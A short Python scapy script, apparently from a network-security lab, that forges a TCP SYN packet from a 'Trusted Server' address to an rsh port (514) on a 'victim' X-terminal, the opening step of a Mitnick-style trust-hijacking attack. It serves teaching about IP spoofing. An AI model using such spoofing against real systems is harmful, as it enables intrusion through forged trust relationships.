#!usr/bin/python3

from scapy.all import *

print("Sending Spoofed SYN packet to X-terminal (victim)")
ip = IP(src="192.168.12.6", dst="192.168.12.5") #src is Trusted Server IP and dst is X-terminal IP
tcp = TCP(sport=1023,dport=514,flags="S", seq=123456789) #sport is Trusted Server port and dport is X-terminal port, S is SYN packet flag
pkt = ip/tcp 
send(pkt,verbose=0) #send packet
